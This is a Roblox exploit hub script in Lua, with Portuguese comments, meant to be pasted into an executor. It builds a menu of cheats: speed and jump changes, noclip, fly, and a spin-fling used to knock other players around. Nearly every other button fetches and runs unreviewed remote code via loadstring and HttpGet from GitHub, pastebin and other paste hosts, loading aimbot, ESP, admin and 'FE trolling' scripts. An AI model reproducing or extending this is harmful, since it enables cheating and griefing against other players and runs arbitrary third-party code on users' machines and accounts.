-- P3dr0Poles Hub V2 (Kavo UI - OceanTheme) - sem Key System
-- Cole esse script no executor (ex: Krnl, Synapse, etc)

-- Kavo UI (source oficial xHeptc)
local Kavo = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Kavo.CreateLib("P3dr0Poles Hub V2", "Ocean") -- OceanTheme

----------------------------------------------------
-- Aba Player (mesmo comportamento da V1)
----------------------------------------------------
local PlayerTab = Window:NewTab("Player")
local PlayerSection = PlayerTab:NewSection("Player Options")

-- WalkSpeed (slider)
PlayerSection:NewSlider("WalkSpeed", "Move speed", 200, 16, function(v)
    pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = v
        end
    end)
end)

-- JumpPower (slider)
PlayerSection:NewSlider("JumpPower", "Jump power", 300, 50, function(v)
    pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").JumpPower = v
        end
    end)
end)

-- Infinite Jump (toggle)
local InfiniteJump = false
PlayerSection:NewToggle("Infinite Jump", "Enable infinite jumping", function(state)
    InfiniteJump = state
end)

game:GetService("UserInputService").JumpRequest:Connect(function()
    if InfiniteJump then
        local pl = game.Players.LocalPlayer
        if pl and pl.Character and pl.Character:FindFirstChildOfClass("Humanoid") then
            pl.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

-- NoClip (toggle)
local NoClip = false
PlayerSection:NewToggle("NoClip", "Toggle noclip", function(state)
    NoClip = state
end)

game:GetService("RunService").Stepped:Connect(function()
    if NoClip then
        local pl = game.Players.LocalPlayer
        if pl and pl.Character then
            for _, part in pairs(pl.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)

-- Fly (textbox for speed + toggle)
local Fly = false
local FlySpeed = 3
PlayerSection:NewTextBox("Fly Speed (ex: 5)", "Set fly speed", function(txt)
    local num = tonumber(txt)
    if num then FlySpeed = num end
end)
PlayerSection:NewToggle("Fly", "Hold WASD + Space/Shift to move", function(state)
    Fly = state
end)

local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local pl = game.Players.LocalPlayer
local character = pl.Character or pl.CharacterAdded:Wait()
local hrp = nil
local function updateHRP()
    character = pl.Character or pl.CharacterAdded:Wait()
    hrp = character:FindFirstChild("HumanoidRootPart")
end
updateHRP()
pl.CharacterAdded:Connect(updateHRP)

RS.RenderStepped:Connect(function()
    if Fly and hrp then
        local moveVector = Vector3.new(0,0,0)
        local cam = workspace.CurrentCamera
        if UIS:IsKeyDown(Enum.KeyCode.W) then moveVector = moveVector + cam.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.S) then moveVector = moveVector - cam.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.A) then moveVector = moveVector - cam.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.D) then moveVector = moveVector + cam.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.Space) then moveVector = moveVector + Vector3.new(0,1,0) end
        if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then moveVector = moveVector - Vector3.new(0,1,0) end
        hrp.Velocity = moveVector.Unit * FlySpeed * 10
    end
end)

----------------------------------------------------
-- Aba FPS
----------------------------------------------------
local FPSTab = Window:NewTab("FPS")
local FPSSection = FPSTab:NewSection("Aimbot / ESP")

FPSSection:NewButton("Enable Aimbot (external)", "Load external aimbot", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua"))()()
    end)
end)

FPSSection:NewButton("Enable ESP (names/distance)", "Load external ESP lib", function()
    pcall(function()
        _G.Settings = { ShowNames = true, ShowDistance = true }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/apakekbebas/esp-lib/main/lib.lua", true))()
    end)
end)

----------------------------------------------------
-- Aba Admin
----------------------------------------------------
local AdminTab = Window:NewTab("Admin")
local AdminSection = AdminTab:NewSection("Admin Scripts")

AdminSection:NewButton("Infinite Yield", "Load Infinite Yield", function()
    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end)
end)
AdminSection:NewButton("AK (Fates Admin)", "Load AK", function()
    pcall(function() loadstring(game:HttpGet("https://angelical.me/ak.lua"))() end)
end)
AdminSection:NewButton("Fates Admin", "Load Fates Admin", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))() end)
end)
AdminSection:NewButton("CMD-X", "Load CMD-X", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))() end)
end)
AdminSection:NewButton("Leg Admin V2", "Load Leg Admin V2", function()
    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))() end)
end)
AdminSection:NewButton("Homebrew Admin", "Load Homebrew", function()
    pcall(function() loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Syntaxx64/HomebrewAdmin/master/Main"))() end)
end)
AdminSection:NewButton("Reviz Admin", "Load Reviz", function()
    pcall(function() loadstring(game:HttpGetAsync("https://pastebin.com/raw/gQg0G6iA"))() end)
end)
AdminSection:NewButton("GX Admin", "Load GX", function()
    pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/v6E9BmFK",true))() end)
end)
AdminSection:NewButton("IV Admin", "Load IV Admin", function()
    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hex/main/Iv%20Admin%20v3.lua'))() end)
end)

----------------------------------------------------
-- Aba Hubs
----------------------------------------------------
local HubsTab = Window:NewTab("Hubs")
local HubsSection1 = HubsTab:NewSection("Spanish Hub")
HubsSection1:NewButton("Spanish Hub 1", "Load Spanish Hub 1", function()
    pcall(function() loadstring(game:HttpGet(('https://paste.myconan.net/499233.txt')))() end)
end)
HubsSection1:NewButton("Ghub v15", "Load Ghub v15", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/GHUBV14XZ/main/Ghub_Main_Loader.txt"))() end)
end)

local HubsSection2 = HubsTab:NewSection("Game Hub")
HubsSection2:NewButton("Game Hub Loader 1", "Load Game Hub Loader", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))() end)
end)
HubsSection2:NewButton("Game Hub Loader 2", "Load Extra", function()
    pcall(function() loadstring(game:HttpGet("https://paste.myconan.net/489718.txt"))() end)
end)

local HubsSection3 = HubsTab:NewSection("Other Hubs")
HubsSection3:NewButton("GHUB-X-ZENXOS-V15", "Load GHUB-X-ZENXOS", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/GHUBV15_X_ZENXOS-MAINLOADER/refs/heads/main/GHUB-X-ZENXOS-V15.txt"))() end)
end)
HubsSection3:NewButton("System Broken", "Load System Broken Hub", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))() end)
end)

local HubsSection4 = HubsTab:NewSection("Animations Hub")
HubsSection4:NewButton("UGC Emotes Hub", "Load UGC Emotes", function()
    pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AFEM-Max-ALL-UGC-EMOTES-FREE-FE-NEW-53663"))() end)
end)
HubsSection4:NewButton("AquaMatrix Hub", "Load AquaMatrix", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))() end)
end)

----------------------------------------------------
-- Aba FE (com os scripts que você pediu + hubs FE já adicionados)
----------------------------------------------------
local FETab = Window:NewTab("FE")
local FESec = FETab:NewSection("FE Scripts")

-- R15 Animation GUI
FESec:NewButton("R15 Animation GUI", "Load R15 Animation GUI", function()
    pcall(function()
        loadstring(game:HttpGet("https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/R15GUI.lua"))()
    end)
end)

-- FE Walk On Walls R6/R15
FESec:NewButton("FE Walk On Walls R6/R15", "Load Walk On Walls", function()
    pcall(function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
    end)
end)

-- R15 Spin Fling (user-provided snippet)
FESec:NewButton("R15 Spin Fling", "Spin fling (R15)", function()
    pcall(function()
        -- wrap provided code safely
        spawn(function()
            local ok,err = pcall(function()
                local power = 500 -- you can change this number after loading if desired
                local pl = game.Players.LocalPlayer
                if not pl then return end
                local char = pl.Character or pl.CharacterAdded:Wait()
                -- Ensure necessary parts exist
                local function safeWait()
                    pcall(function() wait(0.1) end)
                end
                local RunService = game:GetService("RunService")
                local conn = RunService.Stepped:Connect(function()
                    if pl.Character then
                        pcall(function()
                            if pl.Character:FindFirstChild("Head") then pl.Character.Head.CanCollide = false end
                            if pl.Character:FindFirstChild("UpperTorso") then pl.Character.UpperTorso.CanCollide = false end
                            if pl.Character:FindFirstChild("LowerTorso") then pl.Character.LowerTorso.CanCollide = false end
                            if pl.Character:FindFirstChild("HumanoidRootPart") then pl.Character.HumanoidRootPart.CanCollide = false end
                        end)
                    end
                end)
                safeWait()
                local bambam = Instance.new("BodyThrust")
                bambam.Parent = (pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")) or bambam
                bambam.Force = Vector3.new(power,0,power)
                bambam.Location = (pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") and pl.Character.HumanoidRootPart.Position) or Vector3.new()
                -- optional: remove after some time if desired
                delay(8, function()
                    pcall(function() if bambam and bambam.Parent then bambam:Destroy() end end)
                    pcall(function() if conn then conn:Disconnect() end end)
                end)
            end)
            if not ok then
                warn("R15 Spin Fling error:", err)
            end
        end)
    end)
end)

-- FE Hubs section (same hubs que você pediu)
local FEHubSec = FETab:NewSection("FE Hubs")
FEHubSec:NewButton("FE Trolling GUI", "Load FE Trolling GUI", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))() end)
end)
FEHubSec:NewButton("Altair Hub", "Load Altair", function()
    pcall(function() loadstring(game:HttpGet("https://pastefy.app/MxnvA12M/raw"))() end)
end)
FEHubSec:NewButton("Solara Hub", "Load Solara", function()
    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/samuraa1/Solara-Hub/refs/heads/main/SH.lua'))() end)
end)
FEHubSec:NewButton("XVC Script Hub", "Load XVC", function()
    pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/Piw5bqGq"))() end)
end)
FEHubSec:NewButton("C00lgui V2", "Load C00lgui V2", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ckid", true))() end)
end)
FEHubSec:NewButton("C00lkidd F3x???", "Load C00lkidd", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/wik7123/hi/main/copyezskid%20ok"))() end)
end)
FEHubSec:NewButton("Slicer FE V6", "Load Slicer FE V6", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Ahma174/Slicer/refs/heads/main/Slicer%20Fe%20V6"))() end)
end)
FEHubSec:NewButton("Wisl FE", "Load Wisl FE", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/wisl884/wisl-i-Universal-Project1/main/Wisl'i%20Universal%20Project.lua", true))() end)
end)
FEHubSec:NewButton("System Hub", "Load System Hub V3", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/AHMEDPLPL/System-hub-V3/refs/heads/main/System%20Hub%20V3"))() end)
end)
FEHubSec:NewButton("ScriptHub V3", "Load ScriptHub V3", function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV3/main/SCRIPTHUBV3", true))() end)
end)


print("P3dr0Poles Hub V2 loaded (Kavo Ocean).")